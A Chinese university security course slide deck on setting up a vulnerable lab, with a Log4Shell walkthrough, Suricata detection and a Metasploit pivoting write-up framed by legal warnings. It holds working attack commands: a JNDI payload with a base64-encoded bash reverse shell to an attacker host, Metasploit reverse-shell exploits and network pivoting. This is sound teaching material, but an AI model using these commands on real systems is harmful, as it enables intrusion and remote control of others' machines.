---
title: "网络安全"
author: 黄玮
output: revealjs::revealjs_presentation
---

# 网络安全综合实验：开源信息系统搭建、加固与漏洞攻防

---

## 内容提纲

* 基础运行环境准备
* 漏洞攻防环境现状
* 漏洞攻防环境搭建
* 漏洞攻击
* 漏洞利用检测
* 漏洞利用防御与加固

# 基础运行环境准备

---

## 二选一

* 直接使用本学期课程实验所用的虚拟机环境
* [再来一遍] 从零开始搭建基础虚拟机环境

---

## 基础虚拟机环境搭建必知必会

* 安装后虚拟机网卡没有分配到 IP ？
* SSH 服务启用与 SSH 免密登录
    * [可选] [vscode remote on win10](https://www.bilibili.com/video/BV1Hb4y1R7FE?p=52)
* [克隆出来的虚拟机 IP 地址一样？](https://c4pr1c3.github.io/LinuxSysAdmin/cloud-init.md.html#/why-reset-machine-id)
* [多重加载镜像制作与使用](https://www.bilibili.com/video/BV1Hb4y1R7FE?p=19)
* 备份与还原
    * 虚拟机快照与还原
    * 默认配置文件编辑前备份

---

## 基础虚拟机环境搭建必知必会（指令汇编）

```bash
# 确保使用 root 权限操作
sudo su -

# 养成良好配置习惯：备份配置文件
cp /etc/network/interfaces /etc/network/interfaces.bak

# 非交互式配置文件内容追加
cat << EOF >> /etc/network/interfaces
allow-hotplug eth0
iface eth0 inet dhcp
allow-hotplug eth1
iface eth1 inet dhcp
EOF

# 手动重启指定网卡
ifdown eth{0,1} && ifup eth{0,1}

# 配置 SSH 服务开机自启动
systemctl enable ssh

# 启动 SSH 服务
systemctl start ssh
```

# 漏洞攻防环境现状

---

## [本课程第 7 章课件中推荐过的训练学习资源](chap0x07.md)

* [https://github.com/c4pr1c3/ctf-games](https://github.com/c4pr1c3/ctf-games) 获得本课程定制的 Web 漏洞攻防训练环境
* [upload-labs 一个使用 PHP 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场](https://github.com/c0ny1/upload-labs)
* [PHP XXE 漏洞与利用源代码分析示例](https://github.com/vulnspy/phpaudit-XXE)
* [vulhub 提供的 XXE 漏洞学习训练环境](https://github.com/vulhub/vulhub/tree/master/php/php_xxe)
* [python-xxe](https://github.com/c4pr1c3/python-xxe)
* [sqli-labs](https://github.com/c4pr1c3/sqli-labs) | [sqli-labs 国内 gitee 镜像](https://gitee.com/c4pr1c3/sqli-labs)
* [一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo](https://github.com/c0ny1/xxe-lab)
* [upload-labs 一个使用 PHP 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场](https://github.com/c0ny1/upload-labs)

---

## [vulhub](https://github.com/topics/vulhub)

* [vulhub/vulhub](https://github.com/vulhub/vulhub)
* [fofapro/vulfocus](https://github.com/fofapro/vulfocus)
* [sqlsec/ssrf-vuls](https://github.com/sqlsec/ssrf-vuls)

# 漏洞攻防环境搭建

---

## 本课程的选型依据

1. 开箱即用，上手难度低
2. 包含「可复现漏洞环境」数量多、涵盖漏洞类型丰富
3. 运行负载低，可个人电脑单机使用

---

## [fofapro/vulfocus](https://github.com/fofapro/vulfocus)

> 🚀Vulfocus 是一个漏洞集成平台，将漏洞环境 docker 镜像，放入即可使用，开箱即用。 

---

### 快速上手 vulfocus

[c4pr1c3/ctf-games - fofapro/vulfocus](https://github.com/c4pr1c3/ctf-games/tree/master/fofapro/vulfocus)

# 知法守法

---

## 从「知道」到「做到」

- [《中华人民共和国网络安全法》](http://www.cac.gov.cn/2016-11/07/c_1119867116.htm)
- 《刑法》
- [《网络产品安全漏洞管理规定》](http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm)

---

### 《刑法》 {id="the-law-is-the-law-1"}

第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪；提供侵入、非法控制计算机信息系统程序、工具罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。

---

### 《刑法》 {id="the-law-is-the-law-2"}

第二百八十六条
违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。

违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。

故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。

---

### 第六章 渗透测试内容闪回

|                              | 渗透测试 | 网络入侵 |
| --                           | --       | --       |
| **取得被测试目标的法律授权** | ✅       | ❌       |
| 信息收集                     | ✅       | ✅       |
| 目标踩点                     | ✅       | ✅       |
| 网络扫描                     | ✅       | ✅       |
| 漏洞发现                     | ✅       | ✅       |
| 漏洞扫描（识别已知漏洞）     | ✅       | ✅       |
| 漏洞挖掘（发现未知漏洞）     | ✅       | ✅       |
| 漏洞利用之提升权限           | ✅       | ✅       |
| **漏洞利用之后门植入**       | ❌       | ✅       |
| **提供测试报告**             | ✅       | ❌       |
| **擦除入侵痕迹**             | ℹ️        | ✅       |

---

> ℹ️  正常的渗透测试由于不会对被测试目标系统及网络造成破坏、点到即止。既然不是「入侵」，当然不存在「擦除入侵痕迹」的需求。但是，有时会在测试过程中出于评估漏洞危害的目的出发做的一些轻微的系统改动或测试数据获取（例如创建用户、读取指定用户数据），会在渗透测试结束后清理掉本地保存的测试数据以及还原测试前数据和系统状态。

---

### [《网络产品安全漏洞管理规定》](http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm) {id="vuls-disclosure-1"}

![](images/vuls-awd/log4shell-and-aliyun.png)

---

### [《网络产品安全漏洞管理规定》](http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm) {id="vuls-disclosure-2"}

第七条 网络产品提供者应当履行下列网络产品安全漏洞管理义务，确保其产品安全漏洞得到及时修补和合理发布，并指导支持产品用户采取防范措施：

（一）发现或者获知所提供网络产品存在安全漏洞后，应当立即采取措施并组织对安全漏洞进行验证，评估安全漏洞的危害程度和影响范围；对属于其 **上游产品或者组件** 存在的安全漏洞，应当 **立即通知相关产品提供者** 。

（二）应当在 **2日内** 向 `工业和信息化部网络安全威胁和漏洞信息共享平台` 报送相关漏洞信息。报送内容应当包括存在网络产品安全漏洞的产品名称、型号、版本以及漏洞的技术特点、危害和影响范围等。

---

### 阿里云在 Log4Shell 事件中所犯的错误

> 阿里云被工信部暂停网络安全威胁信息共享平台合作单位6个月

* 2021-11-24 阿里云安全团队向 Apache 软件基金会报告漏洞
* 2021-12-05 [`Log4j 2` 开发团队发布第一个漏洞补丁](https://issues.apache.org/jira/browse/LOG4J2-3201)
* 2021-12-09 [工业和信息化部网络安全威胁和漏洞信息共享平台收到有关网络安全专业机构报告](https://wap.miit.gov.cn/xwdt/gxdt/sjdt/art/2021/art_7587d13959e24aeb86887f7ef60d50d3.html)

---

### [负责任的漏洞披露](http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm)

第九条 从事网络产品安全漏洞发现、收集的组织或者个人通过网络平台、媒体、会议、竞赛等方式向社会发布网络产品安全漏洞信息的，应当遵循 **必要、真实、客观** 以及 `有利于防范网络安全风险` 的原则

1. `0day` 不抢跑
2. 远离业务数据
3. 杜绝恐吓式营销
4. 不发布或提供 `exp`
5. 攻防一体不分家
6. 识大体顾大局
7. `0day` 非必要不出境
    - 必要情况为：上报 `0day` 给所属境外网络产品提供者

---

### [《网络产品安全漏洞管理规定》](http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm) {id="vuls-disclosure-3"}

**全文精读、深刻理解、全面落实，不要错过一个字、一个词、一句话。**

---

**知法守法，从「知道」到「做到」。**

# 漏洞攻击

---

## 从单个漏洞靶标开始

> 一切来自于 **用户输入** 的数据都是不可信的。

1. 找到靶标的【访问入口】
2. 收集【威胁暴露面】信息
3. 检测漏洞存在性
4. 验证漏洞可利用性
5. 评估漏洞利用效果

---

## 以 [log4j2 CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) 为例

* [CVSS 3.1 标准 10 分(满分) 漏洞](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2021-44228&vector=AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&version=3.1&source=NIST)
* [通过 CPE 看懂【相关】受影响软件列表](https://nvd.nist.gov/vuln/detail/CVE-2021-44228/cpes) - CVE 通过 CPE 定义收录的受影响软件列表并不【完整】
    * [fofa.so 的 CVE-2021-44228 影响组件专题页面](https://fofa.so/static_pages/log4j2)
    * [Security Advisories / Bulletins / vendors Responses linked to Log4Shell (CVE-2021-44228)](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)

---

## 1. 找到靶标的【访问入口】

![](images/vuls-awd/log4shell-entrypoint.png)

> 【威胁暴露面】信息已经直接看到了，本次漏洞攻击实验已完成该步骤

---

## 漏洞原理详解

* [从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228漏洞](https://www.anquanke.com/post/id/263325)
* [如何看待log4j2远程代码执行漏洞?](https://www.zhihu.com/question/505025655)
* [CVE-2021-44228 漏洞的历史记录，它是如何引入的](https://blog.cloudflare.com/zh-cn/inside-the-log4j2-vulnerability-cve-2021-44228-zh-cn/)

---

## 3. 检测漏洞存在性 {id="log4shell-check-1"}

* 确认受漏洞影响组件的【版本号】
* 源代码审计

---

### 确认受漏洞影响组件的【版本号】

![](images/vuls-awd/log4j2-vul-codes.png)

---

### 靶标环境漏洞源代码反编译

```{.java .number-lines}
// /demo/demo.jar
public class Log4j2RceApplication {
  private static final Logger logger = LogManager.getLogger(com.example.log4j2_rce.Log4j2RceApplication.class);
  
  public static void main(String[] args) {
    SpringApplication.run(com.example.log4j2_rce.Log4j2RceApplication.class, args);
  }
  
  @PostMapping({"/hello"})
  public String hello(String payload) {
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

    /* 以下为缺陷代码片段开始 */
    logger.error("{}", payload);
    logger.info("{}", payload);
    logger.info(payload);
    logger.error(payload);
    /* 以上为缺陷代码片段结束 */
    return "ok";
  }
}
```

---

## 4. 验证漏洞可利用性 {id="log4shell-poc-1"}

---

* 使用 `PoC` 手动测试 `${jndi:ldap://0qxc3d.dnslog.cn/exp}`
    * 此处域名需要自己手动获取专属随机子域名
* [fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)

---

## 4. 验证漏洞可利用性 {id="log4shell-poc-2"}

```{.bash .number-lines}
# 自行替换其中的靶标 URL 和  ldap 协议域名
curl -X POST http://192.168.56.216:49369/hello -d payload='"${jndi:ldap://0qxc3d.dnslog.cn/exp}"'
```

---

## 4. 验证漏洞可利用性 {id="log4shell-poc-3"}

```bash
git clone https://github.com/fullhunt/log4j-scan && cd log4j-scan

# 如果没有安装过 pip
sudo apt update && sudo apt install -y python3-pip

pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple

# 修改 log4j-scan.py
# 手动编辑
# post_data_parameters = ["username", "user", "email", "email_address", "password"]
# 替换为以下内容
# post_data_parameters = ["username", "user", "email", "email_address", "password", "payload"]
# 【或者】使用以下代码无脑替换
sed -i.bak 's/password"/password", "payload"/' log4j-scan.py

# 自行替换其中的靶标 URL
python3 log4j-scan.py --request-type post -u http://192.168.56.216:49369/hello
# [•] CVE-2021-44228 - Apache Log4j RCE Scanner
# [•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# [•] Secure your External Attack Surface with FullHunt.io.
# [•] Initiating DNS callback server (interact.sh).
# [%] Checking for Log4j RCE CVE-2021-44228.
# [•] URL: http://192.168.56.216:49369/hello
# [•] URL: http://192.168.56.216:49369/hello | PAYLOAD: ${jndi:ldap://192.168.56.216.379o3109409t4u4rlr7972p9q103qt2zq.interact.sh/8tvw1m5}
# [•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
# [•] Waiting...
# [!!!] Target Affected
# {'timestamp': '2021-12-21T02:55:30.472289751Z', 'host': '192.168.56.216.379o3109409t4u4rlr7972p9q103qt2zq.379o3109409t4u4rlr7972p9q103qt2zq.interact.sh', 'remote_address': '219.141.176.26'}
```

---

## 5. 评估漏洞利用效果 {id="evaluate-exp-1"}

- [Mr-Xn/JNDIExploit-1](https://github.com/Mr-xn/JNDIExploit-1)
    - [国内镜像下载地址](https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip)

---

## 5. 评估漏洞利用效果 {id="evaluate-exp-2"}

[![asciicast](https://asciinema.org/a/zWSQCVB2KpizZickmdTHzFDNv.svg)](https://asciinema.org/a/zWSQCVB2KpizZickmdTHzFDNv)

---

## 5. 评估漏洞利用效果 {id="evaluate-exp-3"}


```bash
shasum -a 256 JNDIExploit-1.2-SNAPSHOT.jar
# c96ce1de7f739575d86f2e558aeb97dc691077b31a1c510a3dabf096c827dfa8  JNDIExploit-1.2-SNAPSHOT.jar

# 获取可用 post-exploit payload 清单
java -jar JNDIExploit-1.2-SNAPSHOT.jar -u 

# 进入靶标容器查看支持的 shell 类型
docker exec -it <container_name> bash
cat /etc/shells
# # /etc/shells: valid login shells
# /bin/sh
# /bin/bash
# /usr/bin/bash
# /bin/rbash
# /usr/bin/rbash
# /bin/dash
# /usr/bin/dash

# 此处省略【手动】测试 reverse shell 的过程

# 192.168.56.214 为【攻击者】主机 IP
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.56.214 

# 在【攻击者】主机上提前运行监听程序，等待反弹连接
nc -l -p 7777

# 第一个参数里的 192.168.56.216 是【靶机】IP
# 后续参数里的 192.168.56.214 应是【攻击者】主机 IP
curl http://192.168.56.216:19825/hello -d 'payload=${jndi:ldap://192.168.56.214:1389/TomcatBypass/Command/Base64/'$(echo -n 'bash -i >& /dev/tcp/192.168.56.214/7777 0>&1' | base64 -w 0 | sed 's/+/%252B/g' | sed 's/=/%253d/g')'}'

# 执行完上述【攻击负载】投放代码后，【攻击者】主机的 nc 窗口成功 getshell
```

# 漏洞利用检测

---

## 基本方法

- 面向网络流量的深度包检测
- 运行时应用自我保护
    - Runtime Application Self-Protection (RASP)

---

## 漏洞利用流量检测实战

```bash
# 启动靶机镜像
docker run -d --name log4shell -p 5555:8080 vulfocus/log4j2-rce-2021-12-09:latest

# 启动 suricata 检测容器
# 此处 eth1 对应靶机所在虚拟机的 host-only 网卡 IP
docker run -d --name suricata --net=host -e SURICATA_OPTIONS="-i eth1" jasonish/suricata:6.0.4

# 更新 suricata 规则，更新完成测试完规则之后会自动重启服务
docker exec -it suricata suricata-update -f

# 重启 suricata 容器以使规则生效
# docker restart suricata

# 监视 suricata 日志
docker exec -it suricata tail -f /var/log/suricata/fast.log

# 重复前述【漏洞攻击】实验
# 12/21/2021-08:30:55.434186  [**] [1:2034647:1] ET EXPLOIT Apache log4j RCE Attempt (http ldap) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -> 192.168.56.216:5555
# 12/21/2021-08:30:55.434186  [**] [1:2034649:1] ET EXPLOIT Apache log4j RCE Attempt (tcp ldap) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -> 192.168.56.216:5555
# 12/21/2021-08:30:55.434186  [**] [1:2034700:1] ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M2 (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -> 192.168.56.216:5555
# 12/21/2021-08:30:55.434186  [**] [1:2034757:2] ET EXPLOIT Apache log4j RCE Attempt (http ldap) (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -> 192.168.56.216:5555
# 12/21/2021-08:30:55.434186  [**] [1:2034759:1] ET EXPLOIT Apache log4j RCE Attempt (tcp ldap) (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -> 192.168.56.216:5555
# 12/21/2021-08:30:55.434186  [**] [1:2034800:2] ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M2 (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -> 192.168.56.216:5555
# 12/21/2021-08:30:55.434186  [**] [1:2034661:1] ET HUNTING Possible Apache log4j RCE Attempt - Any Protocol (CVE-2021-44228) [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.56.1:52861 -> 192.168.56.216:5555
# 12/21/2021-08:30:55.434186  [**] [1:2034783:2] ET HUNTING Possible Apache log4j RCE Attempt - Any Protocol (Outbound) (CVE-2021-44228) [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.56.1:52861 -> 192.168.56.216:5555
```

# 漏洞利用防御与加固

---

[![](images/vuls-awd/log4shell-detect-1.jpeg)](https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)

# 场景化漏洞攻防初体验

---

> 以 vulfocus 提供的【跨网段渗透(常见的dmz)】为例

可能是全网第一份关于该场景的公开 WriteUp 。

---

## 场景安装与配置

* 场景管理 - 从【场景商店】下载 `跨网段渗透(常见的dmz)` - 发布
* 进入【场景】，启动场景
* 阅读场景说明，找到场景入口地址，准备开始【跨网段渗透】体验

---

## 捕获指定容器的上下行流量

```bash
# 建议放到 tmux 会话
container_name="<替换为目标容器名称或ID>"
docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump
```

> 为后续的攻击过程「分析取证」保存流量数据

---

## 攻破靶标1

```bash
# metasploit 基础配置
# 更新 metasploit
sudo apt install -y metasploit-framework

# 初始化 metasploit 本地工作数据库
sudo msfdb init

# 启动 msfconsole
msfconsole

# 确认已连接 pgsql
db_status

# 建立工作区
workspace -a demo

# 信息收集之服务识别与版本发现
# 通过 vulfocus 场景页面看到入口靶标的开放端口
db_nmap -p 29551 192.168.56.216 -n -A

# search exp in metasploit
search struts2 type:exploit
# Matching Modules
# ================
# 
#    #  Name                                             Disclosure Date  Rank       Check  Description
#    -  ----                                             ---------------  ----       -----  -----------
# ...
#    2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
# ...
#    7  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution

# 查看 exp 详情
# 可以直接通过搜索结果编号，也可以通过搜索结果的 Name 字段
info 2

# 继续完善搜索关键词
search S2-059 type:exploit

# Matching Modules
# ================
# 
#    #  Name                                        Disclosure Date  Rank       Check  Description
#    -  ----                                        ---------------  ----       -----  -----------
#    0  exploit/multi/http/struts2_multi_eval_ognl  2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
# 

# 使用上述 exp
use 0

# 查看 exp 可配置参数列表
show options

# 查看可用 exp payloads
show payloads

# 使用合适的 exp payload
set payload payload/cmd/unix/reverse_bash

# 配置 exp 参数
# 确保所有 Required=yes 参数均正确配置

# 靶机 IP
set RHOSTS 192.168.56.216 
# 靶机目标端口
set rport  29551          
# 攻击者主机 IP
set LHOST  192.168.56.214 

# 再次检查 exp 配置参数列表
show options

# getshell
run -j

# 如果攻击成功，查看打开的 reverse shell
sessions -l

# Active sessions
# ===============
# 
#   Id  Name  Type            Information  Connection
#   --  ----  ----            -----------  ----------
#   1         shell cmd/unix               192.168.56.214:4444 -> 192.168.56.216:60690  (192.168.56.216)

# 进入会话 1
sessions -i 1
# 无命令行交互提示信息，试一试 Bash 指令
id

# get flag-1
ls /tmp
# flag-{bmh59f8b130-69ea-495d-86a9-dbf789e18b3f}

# 通过 CTRL-Z 将当前会话放到后台继续执行
```

---

## 建立立足点并发现靶标2-4

```bash
# upgrade cmdshell to meterpreter shell
# 也可以直接 sessions -u 1
search meterpreter type:post
use post/multi/manage/shell_to_meterpreter
show options
set lhost 192.168.56.214
set session 1

run -j

sessions -l
# Active sessions
# ===============
# 
#   Id  Name  Type                   Information          Connection
#   --  ----  ----                   -----------          ----------
#   1         shell cmd/unix                              192.168.56.214:4444 -> 192.168.56.216:60690  (192.168.56.216)
#   2         meterpreter x86/linux  root @ 192.170.84.5  192.168.56.214:4433 -> 192.168.56.216:39756  (192.168.56.216)

# 进入 meterpreter 会话 2
sessions -i 2

# setup pivot: run autoroute
# 查看网卡列表
ipconfig
# Interface  1
# ============
# Name         : lo
# Hardware MAC : 00:00:00:00:00:00
# MTU          : 65536
# Flags        : UP,LOOPBACK
# IPv4 Address : 127.0.0.1
# IPv4 Netmask : 255.0.0.0
# 
# 
# Interface 23
# ============
# Name         : eth0
# Hardware MAC : 02:42:c0:aa:54:05
# MTU          : 1500
# Flags        : UP,BROADCAST,MULTICAST
# IPv4 Address : 192.170.84.5
# IPv4 Netmask : 255.255.255.0
# 查看路由表
route
# IPv4 network routes
# ===================
# 
#     Subnet        Netmask        Gateway       Metric  Interface
#     ------        -------        -------       ------  ---------
#     0.0.0.0       0.0.0.0        192.170.84.1  0       eth0
#     192.170.84.0  255.255.255.0  0.0.0.0       0       eth0

# 查看 ARP 表
arp
# ARP cache
# =========
# 
#     IP address    MAC address        Interface
#     ----------    -----------        ---------
#     192.170.84.1  02:42:f9:ce:65:00

run autoroute -s 192.170.84.0/24

# 检查 Pivot 路由是否已创建成功
run autoroute -p
# Active Routing Table
# ====================
# 
#    Subnet             Netmask            Gateway
#    ------             -------            -------
#    192.170.84.0       255.255.255.0      Session 2

# portscan through pivot
search portscan
use auxiliary/scanner/portscan/tcp
show options
# 根据子网掩码推导
set RHOSTS 192.170.84.2-254
# 根据「经验」
set rport 7001
# 根据「经验」
set threads 10
# 开始扫描
run -j

# 等到扫描结果 100%
# 查看主机存活情况
hosts

# 查看发现的服务列表
services
# Services
# ========
# 
# host            port   proto  name           state   info
# ----            ----   -----  ----           -----   ----
# 192.168.56.216  29551  tcp    http           open    Jetty 9.4.31.v20200723
# 192.170.84.2    7001   tcp                   open
# 192.170.84.3    7001   tcp                   open
# 192.170.84.4    7001   tcp                   open
# 192.170.84.5    7001   tcp                   open

# setup socks5 proxy 
search socks_proxy
use auxiliary/server/socks_proxy
run -j
# 查看后台任务
jobs -l
# Jobs
# ====
# 
#   Id  Name                           Payload  Payload opts
#   --  ----                           -------  ------------
#   4   Auxiliary: server/socks_proxy

# 新开一个 ssh 会话窗口
# 检查 1080 端口服务开放情况
sudo lsof -i tcp:1080 -l -n -P
# COMMAND    PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
# ruby    299727     1000   10u  IPv4 910459      0t0  TCP *:1080 (LISTEN)

# 编辑 /etc/proxychains4.conf
sudo sed -i.bak -r "s/socks4\s+127.0.0.1\s+9050/socks5 127.0.0.1 1080/g" /etc/proxychains4.conf

proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.170.84.2-5

# 回到 metasploit 会话窗口
# 重新进入 shell 会话
sessions -i 1
curl http://192.170.84.2:7001 -vv
curl http://192.170.84.3:7001 -vv
curl http://192.170.84.4:7001 -vv
```

---

## 攻破靶标2-4

```bash
# search exploit
search cve-2019-2725

# getshell
use 0
show options
set RHOSTS 192.170.84.2
# 分别设置不同的靶机 IP 
set lhost 192.168.56.214
# 分别 run
run -j

# get flag2-4
sessions -c "ls /tmp" -i 3,4,5
```

---

## 发现终点靶标

```bash
# 通过网卡、路由、ARP 发现新子网 192.169.85.0/24
sessions -c "ifconfig" -i 3,4,5

# ...
# [*] Running 'ifconfig' on shell session 5 (192.170.84.3)
# eth0      Link encap:Ethernet  HWaddr 02:42:c0:aa:54:03
#           inet addr:192.170.84.3  Bcast:192.170.84.255  Mask:255.255.255.0
#           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
#           RX packets:828 errors:0 dropped:0 overruns:0 frame:0
#           TX packets:47 errors:0 dropped:0 overruns:0 carrier:0
#           collisions:0 txqueuelen:0
#           RX bytes:38734 (38.7 KB)  TX bytes:4854 (4.8 KB)
# 
# eth1      Link encap:Ethernet  HWaddr 02:42:c0:a9:55:03
#           inet addr:192.169.85.3  Bcast:192.169.85.255  Mask:255.255.255.0
#           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
#           RX packets:19 errors:0 dropped:0 overruns:0 frame:0
#           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
#           collisions:0 txqueuelen:0
#           RX bytes:1342 (1.3 KB)  TX bytes:0 (0.0 B)
# 
# lo        Link encap:Local Loopback
#           inet addr:127.0.0.1  Mask:255.0.0.0
#           UP LOOPBACK RUNNING  MTU:65536  Metric:1
#           RX packets:6 errors:0 dropped:0 overruns:0 frame:0
#           TX packets:6 errors:0 dropped:0 overruns:0 carrier:0
#           collisions:0 txqueuelen:1000
#           RX bytes:328 (328.0 B)  TX bytes:328 (328.0 B)
# ...

# portscan through pivot
# 将会话 4 升级为 meterpreter shell
sessions -u 4
# 新的 meterpreter shell 会话编号此处为 6
sessions -i 6
# 将新发现的子网加入 Pivot Route
run autoroute -s 192.169.85.0/24
run autoroute -p
# Active Routing Table
# ====================
# 
#    Subnet             Netmask            Gateway
#    ------             -------            -------
#    192.169.85.0       255.255.255.0      Session 7
#    192.170.84.0       255.255.255.0      Session 2
# 通过 CTRL-Z 将当前会话放到后台继续执行
use scanner/portscan/tcp
set RHOSTS 192.169.85.2-254
set ports 80
run 
# 发现终点靶标 192.169.85.2 80(tcp)
```

---

## 拿到终点靶标上的 Flag

```bash
# 利用跳板机 192.170.84.3 的 shell 会话「踩点」最终靶标
sessions -c "curl http://192.169.85.2" -i 5
# 发现没安装 curl ，试试 wget
sessions -c "wget http://192.169.85.2" -i 5
# 发现没有命令执行回显，试试组合命令
sessions -c "wget http://192.169.85.2 -O /tmp/result && cat /tmp/result" -i 5
# 发现 get flag 提示
sessions -c "wget 'http://192.169.85.2/index.php?cmd=ls /tmp' -O /tmp/result && cat /tmp/result" -i 5
# index.php?cmd=ls /tmpflag-{bmh8f2e8555-eab8-43f9-8654-78c019607788}
```

---

## 停止抓包，开始分析

* 进入 `vulfocus` 所在虚拟机的 GUI 桌面，使用 `Wireshark` 打开捕获到的数据包
* 通过 `scp` 将捕获到的数据包拷贝到宿主机上使用 `Wireshark` 分析

---

> 试试本课程《第九章 入侵检测》和《第十二章 计算机取证》实验中用到的 `Suricata` 来分析此次场景的攻击流量包

# 总结

---

- 现有的开源技术足以支撑我们在『严格受控条件』下搭建起一个 **高仿真度** 的漏洞攻防网络环境
- **⽹络安全攻防实验必须严格限制在局域⽹范围内**
- **知法守法**

